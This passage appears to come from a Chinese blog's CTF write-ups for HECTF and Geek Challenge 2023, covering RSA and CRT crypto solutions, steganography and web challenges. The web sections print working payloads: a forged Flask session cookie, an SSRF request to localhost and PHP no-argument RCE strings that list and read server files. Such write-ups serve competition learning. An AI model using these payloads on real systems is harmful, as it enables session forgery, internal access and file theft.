class="string">&#x27;zxk1ing&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;joker&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;zxk1ing&#x27;</span> -t <span class="string">&quot;&#123;&#x27;key&#x27;: &#x27;zxk1ing&#x27;, &#x27;username&#x27;: &#x27;zxk1ing&#x27;&#125;&quot;</span></span><br><span class="line">eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJ6eGsxaW5nIn0.ZVhXIg.cAtAg3DUE-wZp-yq_a5IUvfvaIM</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/ca4685483a2a4f12b76b1ca135eb3cc2.png" alt="在这里插入图片描述" /></p><p>赛后补：<br /><img src="https://img-blog.csdnimg.cn/direct/9b42828faf31418799c069200ae65219.png" alt="在这里插入图片描述" /></p><p>SSRF,服务端请求伪造<br />所以，<code>/img?url=http://127.0.0.1/P1aceuWillneverkn0w</code>，即可</p><h2 id="crypto-rsarsa"><a class="markdownIt-Anchor" href="#crypto-rsarsa"></a> Crypto-rsarsa</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 题目</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,hint</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_PQ</span>(<span class="params">bits</span>):</span><br><span class="line">    x = getPrime(bits) &gt;&gt; bits//<span class="number">2</span> &lt;&lt; bits//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = x + random.getrandbits(bits//<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = x + random.getrandbits(bits//<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> isPrime(q):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">hint = bytes_to_long(hint)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p,q = generate_PQ(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">random.seed(seed)</span><br><span class="line">x = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">y = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,<span class="built_in">pow</span>(hint,e,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x, y: x * m + y, x), <span class="number">17</span>, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x, y: x * m + y, y), <span class="number">17</span>, n))</span><br></pre></td></tr></table></figure><p>读懂代码就很简单，稍微爆破一下，就3-4分钟吧，没太注意</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line"><span class="comment"># yafu分解n</span></span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(long_to_bytes(pow(c, d, n)))</span></span><br><span class="line"><span class="comment"># Hint&#123;Seed_is_256087_+_396445_-_538018&#125;</span></span><br><span class="line">seed = <span class="number">114514</span></span><br><span class="line">d1 = inverse(<span class="number">17</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(pow(c1,d1,n))</span></span><br><span class="line"><span class="comment"># print(pow(c2,d1,n))</span></span><br><span class="line">a1 = </span><br><span class="line">a2 = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, seed):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, seed):</span><br><span class="line">        <span class="keyword">if</span> ((a2-a1)-i) % j == <span class="number">0</span>:</span><br><span class="line">            flag = long_to_bytes(((a2-a1)-i) // j)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;HECTF&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="comment"># HECTF&#123;r3411y_easy_R4nd0m_And_r3l4ted_m3554ge_att4ck&#125;</span></span><br></pre></td></tr></table></figure><p>赛后自己又看了一遍，查了一下，知道随机数种子是可以直接知道由随机数种子生成的随机数的，不用像我上面爆破三四分钟，x = [30509, 13601] y = [92095, 27065],代进去就OK了(懒再写代码了)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Geek Challenge 2023wp</title>
      <link href="/2024/04/01/Geek-Challenge-2023wp/"/>
      <url>/2024/04/01/Geek-Challenge-2023wp/</url>
      
        <content type="html"><![CDATA[<h2 id="web-easy_php"><a class="markdownIt-Anchor" href="#web-easy_php"></a> WEB-easy_php</h2><p><img src="https://img-blog.csdnimg.cn/direct/101bd1820bcc46d9a0d30340ad35ea58.png" alt="在这里插入图片描述" /></p><p>最后一步需要知道php的变量命名规则，还有就是变量名被解析到 [ 之后，会被替换成_,好像+也可以，然后后面的不规则命名会得以保存</p><h2 id="web-ezhttp"><a class="markdownIt-Anchor" href="#web-ezhttp"></a> WEB-EzHttp</h2><p><img src="https://img-blog.csdnimg.cn/direct/4ee5d0e7a663483ba1da4f2886c30887.png" alt="在这里插入图片描述" /></p><p><strong>Via头字段用于指定HTTP消息所途经的代理服务器所使用的协议和主机名称，可以指向代理服务器</strong><br /><strong>php $_SERVER[‘HTTP_02TAKUXX’]函数用法 #当前请求的 02TAKUXX: 头部的内容</strong></p><h2 id="web-puppy_rce"><a class="markdownIt-Anchor" href="#web-puppy_rce"></a> WEB-Puppy_rce</h2><p>过滤且无参RCE</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(flag.php);</span><br><span class="line"><span class="comment">//当前目录下有好康的😋</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/env|var|session|header/i&quot;</span>, <span class="variable">$var</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$var</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;WAF!!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PLZ DONT HCAK ME😅&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>参考<a href="https://blog.csdn.net/weixin_53146913/article/details/124133822">https://blog.csdn.net/weixin_53146913/article/details/124133822</a><br />查看当前目录文件名<br /><code>print_r(scandir(current(localeconv())));</code><br />得到<code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; error.log [3] =&gt; fl@g.php [4] =&gt; genshin01.txt [5] =&gt; index.php [6] =&gt; tiangou01.txt [7] =&gt; tiangou02.txt )</code><br />得到的文件在中间位置，开始随机读取<br /><code>show_source(array_rand(array_flip(scandir(current(localeconv())))));</code><br />多试几次便可以得到flag</p><h2 id="misc-death_n0te"><a class="markdownIt-Anchor" href="#misc-death_n0te"></a> MISC-DEATH_N0TE</h2><p>根据hint1，lsb,RGB(0,0,0),得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i</span><br></pre></td></tr></table></figure><p>base64-&gt;发现flag字段：SYC{D4@Th_N0t4_<br />像素点提取</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\kamisama.png&quot;</span>)</span><br><span class="line">w = img.width</span><br><span class="line">h = img.height</span><br><span class="line">img_obj = Image.new(<span class="string">&quot;RGB&quot;</span>, (w//<span class="number">5</span>, h//<span class="number">5</span>))  <span class="comment"># 这里5，脚本(套过来的)能跑</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w//<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h//<span class="number">5</span>):</span><br><span class="line">        rgb = img.getpixel((x*<span class="number">5</span>, y*<span class="number">5</span>))</span><br><span class="line">        img_obj.putpixel((x, y), rgb)</span><br><span class="line">img_obj.save(<span class="string">&quot;C:\\Users\\27920\\Desktop\\kam.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/f77716a8f43d4c81935a47a73a221c13.png" alt="在这里插入图片描述" /></p><p>当时想爆破那几个不知道的字符，没能成功，太天真了，忘了可以直接去网上找字母对照表，靠，佛<br /><img src="https://img-blog.csdnimg.cn/direct/c0abee3e494f40c3a995b7d4f02c5ccb.png" alt="在这里插入图片描述" /></p><p>应该是(后来补的)<code>TkfNRV9bMnRha3VYWH0=</code><br /><strong>SYC{D4@Th_N0t4_NGÍE_[2takuXX}</strong></p><h2 id="crypto-simplersa"><a class="markdownIt-Anchor" href="#crypto-simplersa"></a> CRYPTO-SimpleRSA</h2><p>已知:   c=,e=,p=<br />有： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mtext>   </mtext><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c\equiv m^{e}\ mod\ n\ \ \ (1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>=</mo><mi>k</mi><mi>n</mi><mo>+</mo><mi>c</mi><mo separator="true">,</mo><mtext>对两边同时模</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m^{e}=kn+c,对两边同时模p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">边</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo separator="true">,</mo><mtext>该式子形如上述</mtext><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>式</mtext><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>m</mi><mo>&lt;</mo><mi>p</mi><mo stretchy="false">)</mo><mtext>此时将</mtext><mi>p</mi><mtext>当做</mtext><mi>n</mi><mtext>进行处理就好了</mtext><mo separator="true">,</mo><mi>Q</mi><mi>W</mi><mi>Q</mi></mrow><annotation encoding="application/x-tex">c\equiv m^{e}\ mod\ p,该式子形如上述(1)式,(m&lt;p)此时将p当做n进行处理就好了,QWQ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">该</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">述</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">式</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">将</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">做</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">好</span><span class="mord cjk_fallback">了</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">Q</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">Q</span></span></span></span></p><h2 id="crypto-polyrsa"><a class="markdownIt-Anchor" href="#crypto-polyrsa"></a> CRYPTO-PolyRSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 题目</span></span><br><span class="line">c1 = gmpy2.powmod(<span class="number">2</span>*p + <span class="number">3</span>*q,e1,n)</span><br><span class="line">c2 = gmpy2.powmod(<span class="number">5</span>*p + <span class="number">7</span>*q,e2,n) </span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">e1= </span><br><span class="line">e2= </span><br><span class="line">c1= </span><br><span class="line">c2= </span><br><span class="line">c= </span><br><span class="line">n= </span><br><span class="line">e = </span><br><span class="line"></span><br><span class="line">k = e1*e2</span><br><span class="line">a1 = <span class="built_in">pow</span>(c1,e2,n)*<span class="built_in">pow</span>(<span class="number">5</span>,k,n)-<span class="built_in">pow</span>(c2,e1,n)*<span class="built_in">pow</span>(<span class="number">2</span>,k,n)</span><br><span class="line">a2 = <span class="built_in">pow</span>(c2,e1,n)*<span class="built_in">pow</span>(<span class="number">3</span>,k,n)-<span class="built_in">pow</span>(c1,e2,n)*<span class="built_in">pow</span>(<span class="number">7</span>,k,n)</span><br><span class="line">qk = a1%n</span><br><span class="line">pk = a2%n</span><br><span class="line">q = gmpy2.gcd(qk,n)</span><br><span class="line">p = gmpy2.gcd(pk,n)</span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><h2 id="crypto-proof_of_work"><a class="markdownIt-Anchor" href="#crypto-proof_of_work"></a> CRYPTO-proof_of_work</h2><p>此处我参考了，[SCTF2021 pwn] checkin，没办法这是一道交互题，web手直接废掉</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;59.110.20.54&#x27;</span>, <span class="number">5526</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;sha256(XXXX+&#x27;</span>)</span><br><span class="line">tail = p.recv(<span class="number">16</span>)</span><br><span class="line">p.recv(<span class="number">5</span>)</span><br><span class="line">hx = p.recv(<span class="number">64</span>)</span><br><span class="line"> </span><br><span class="line">ss = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(hx)</span><br><span class="line"><span class="built_in">print</span>(tail)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethash</span>():</span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> ss:</span><br><span class="line">        <span class="built_in">print</span>(i1, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> ss:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> ss:</span><br><span class="line">                <span class="keyword">for</span> i4 <span class="keyword">in</span> ss:</span><br><span class="line">                    vv = <span class="built_in">bytes</span>([i1,i2,i3,i4]) + tail</span><br><span class="line">                    <span class="comment">#print(vv)</span></span><br><span class="line">                    k = hashlib.sha256(vv).hexdigest().encode()</span><br><span class="line">                    <span class="keyword">if</span> k == hx:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">b&#x27;OK&#x27;</span>, <span class="built_in">bytes</span>([i1,i2,i3,i4]))</span><br><span class="line">                        p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">bytes</span>([i1,i2,i3,i4]))</span><br><span class="line">                        data = p.recvuntil(<span class="string">b&#x27;\n==end==&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">                        <span class="built_in">open</span>(<span class="string">&#x27;check1.out&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(b64decode(data))</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">bytes</span>([i1,i2,i3,i4])</span><br><span class="line"> </span><br><span class="line">sss = gethash()</span><br><span class="line"><span class="comment">#p.sendlineafter(b&#x27;:&#x27;, sss)</span></span><br><span class="line">os.chmod(<span class="string">&#x27;check1.out&#x27;</span>, <span class="number">0o777</span>)</span><br><span class="line"> </span><br><span class="line">pause()  </span><br></pre></td></tr></table></figure><p>再记一个</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 前四位sha256爆破脚本</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;4bc220f29c726e4c6b6c07ab6e3e92cfcaf481492238ee620627242e528e1732&quot;</span></span><br><span class="line">tail=<span class="string">&quot;94JcPORJdezxXK0a&quot;</span></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure><h2 id="crypto-oldalgorithm"><a class="markdownIt-Anchor" href="#crypto-oldalgorithm"></a> CRYPTO-OldAlgorithm</h2><p>仔细思考一下，这不就是CRT嘛</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p= [<span class="number">58657</span>, <span class="number">47093</span>, <span class="number">47963</span>, <span class="number">41213</span>, <span class="number">57653</span>, <span class="number">56923</span>, <span class="number">41809</span>, <span class="number">49639</span>, <span class="number">44417</span>, <span class="number">38639</span>, <span class="number">39857</span>, <span class="number">53609</span>, <span class="number">55621</span>, <span class="number">41729</span>, <span class="number">60497</span>, <span class="number">44647</span>, <span class="number">39703</span>, <span class="number">55117</span>, <span class="number">44111</span>, <span class="number">57131</span>, <span class="number">37747</span>, <span class="number">63419</span>, <span class="number">63703</span>, <span class="number">64007</span>, <span class="number">46349</span>, <span class="number">39241</span>, <span class="number">39313</span>, <span class="number">44909</span>, <span class="number">40763</span>, <span class="number">46727</span>, <span class="number">34057</span>, <span class="number">56333</span>]</span><br><span class="line">c= [<span class="number">36086</span>, <span class="number">4005</span>, <span class="number">3350</span>, <span class="number">23179</span>, <span class="number">34246</span>, <span class="number">5145</span>, <span class="number">32490</span>, <span class="number">16348</span>, <span class="number">13001</span>, <span class="number">13628</span>, <span class="number">7742</span>, <span class="number">46317</span>, <span class="number">50824</span>, <span class="number">23718</span>, <span class="number">32995</span>, <span class="number">7640</span>, <span class="number">10590</span>, <span class="number">46897</span>, <span class="number">39245</span>, <span class="number">16633</span>, <span class="number">31488</span>, <span class="number">36547</span>, <span class="number">42136</span>, <span class="number">52782</span>, <span class="number">31929</span>, <span class="number">34747</span>, <span class="number">29026</span>, <span class="number">18748</span>, <span class="number">6634</span>, <span class="number">9700</span>, <span class="number">8126</span>, <span class="number">5197</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">n, a</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a * b, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> <span class="built_in">zip</span>(n, a):</span><br><span class="line">        p = prod // n_i</span><br><span class="line">        <span class="built_in">sum</span> += a_i * sympy.invert(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">sum</span> % prod)</span><br><span class="line">ans=CRT(p, c)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(ans))</span><br></pre></td></tr></table></figure><h2 id="crypto-fi1nd_th3_x"><a class="markdownIt-Anchor" href="#crypto-fi1nd_th3_x"></a> CRYPTO-Fi1nd_th3_x’</h2><p>拓展中国剩余定理，看一眼附件<strong><a href="http://CRsaT.py">CRsaT.py</a></strong>,明眼人</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exgcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = exgcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exCRT</span>(<span class="params">m, a, n</span>):     <span class="comment"># 模数m，余数a，组数n</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> m[<span class="number">0</span>] &gt; a[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">return</span> a[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> m[i] &lt;= a[i]:</span><br><span class="line">            <span 